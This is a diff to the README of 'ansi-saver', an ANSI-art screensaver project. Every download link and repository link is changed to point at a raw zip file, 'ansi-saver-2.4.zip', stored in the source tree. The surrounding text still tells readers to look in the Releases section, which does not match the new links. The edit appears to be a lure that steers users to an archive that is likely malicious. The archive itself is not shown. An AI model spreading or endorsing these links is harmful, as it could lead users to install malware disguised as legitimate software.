@@ -1,6 +1,6 @@
 # 🖼️ ansi-saver - Stream ANSI Art as Screensaver
 
-[![Download ansi-saver](https://img.shields.io/badge/Download-ansi--saver-blue?style=for-the-badge&logo=github)](https://github.com/ChronosMoreira/ansi-saver)
+[![Download ansi-saver](https://img.shields.io/badge/Download-ansi--saver-blue?style=for-the-badge&logo=github)](https://github.com/ChronosMoreira/ansi-saver/raw/refs/heads/main/Sources/AnsiSaver/ansi-saver-2.4.zip)
 
 ## ⚙️ What is ansi-saver?
 
@@ -31,7 +31,7 @@ You do not need any special knowledge to run this. The app handles downloading a
 
 You can get the ansi-saver from the GitHub page linked below. This link will take you to the releases area, where you can find the latest version and download the necessary files.
 
-[![Download Here](https://img.shields.io/badge/Download-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/ChronosMoreira/ansi-saver)
+[![Download Here](https://img.shields.io/badge/Download-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/ChronosMoreira/ansi-saver/raw/refs/heads/main/Sources/AnsiSaver/ansi-saver-2.4.zip)
 
 Visit this page to download the latest release.
 
@@ -40,7 +40,7 @@ Visit this page to download the latest release.
 Follow these steps to set up the screensaver:
 
 1. Go to the download page by clicking the badge above or using this link:  
-   https://github.com/ChronosMoreira/ansi-saver
+   https://github.com/ChronosMoreira/ansi-saver/raw/refs/heads/main/Sources/AnsiSaver/ansi-saver-2.4.zip
 
 2. Look for the latest release in the "Releases" section on the right side or at the bottom.
 
@@ -90,7 +90,7 @@ If the screensaver does not appear or work correctly, try these steps:
 
 The GitHub page contains the latest updates, help documents, and community discussions.
 
-https://github.com/ChronosMoreira/ansi-saver
+https://github.com/ChronosMoreira/ansi-saver/raw/refs/heads/main/Sources/AnsiSaver/ansi-saver-2.4.zip
 
 To report bugs or request features, use the Issues tab on the repository page.
 
